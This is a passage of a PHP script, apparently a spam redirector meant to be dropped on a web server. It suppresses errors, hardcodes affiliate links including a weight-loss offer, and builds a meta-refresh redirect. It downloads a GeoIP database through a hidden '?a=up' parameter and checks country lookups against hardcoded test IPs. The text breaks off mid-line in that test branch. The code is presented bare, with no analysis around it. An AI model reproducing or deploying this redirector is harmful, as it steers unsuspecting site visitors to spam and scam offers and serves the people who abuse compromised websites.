<?php
@set_time_limit(0);
@error_reporting(0);
@ini_set('max_execution_time', 0);
$links_str = 'http://newsdailybusiness.com/?channel=1&ampm=1ab&ampmID=4c4943ded&ampofferID=8e63d5f1&timeID=me28na11|||http://quickdrozdietweightathome.com/?a=370957&c=wl_con';

$redir_template = '<meta http-equiv="refresh" content="2; url=%s">';

$links = explode('|||', trim($links_str, ','));

if (count($links) !== 2)
{
	die('ERR_LINKS');
}

function code_base()
{
	global	$links_str, $links, $redir_template;

	if (isset($_GET['a']))
	{
		$a = $_GET['a'];
	}
	else
	{
		$a = '';	
	}

	$geo_file_gz_name = 'rd_geo.db';

	if ($a == 'up')
	{
		$geodb_url = 'http://geolite.maxmind.com/download/geoip/database/GeoLiteCountry/GeoIP.dat.gz';

		if (!file_exists($geo_file_gz_name))
		{
			$ch = curl_init(str_replace(' ', '%20', $geodb_url));
			curl_setopt($ch, CURLOPT_TIMEOUT, 90);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
			curl_setopt($ch, CURLOPT_DNS_USE_GLOBAL_CACHE, false);
			curl_setopt($ch, CURLOPT_FAILONERROR, true);
			curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
			$data = @curl_exec($ch);
			$err = curl_errno($ch);
			curl_close($ch);

			if ($err)
			{
				die('ERR_CURL');
			}

			$v = new SimplePie_gzdecode($data);
			if (!$v->parse())
			{
				die('ERR_DECODE');
			}

			if (!file_put_contents($geo_file_gz_name, $v->data, LOCK_EX))
			{
				unlink($geo_file_gz_name);
				die('ERR_WRITE_FILE');
			}

			if (filesize($geo_file_gz_name) == 0)
			{
				die('ERR_GZ_FILE');
			}
		}
		die('>UP_OK<');
	} else if ($a == 'tst')
	{
		$us_test_ip = '174.34.224.167';
		$eu_test_ip = '46.165.195.139';

		$gi = geoip_open($geo_file_gz_name, GEOIP_STANDARD);
		if ($gi)
		{
			if ((geoip_country_code_by_addr($gi, $us_tes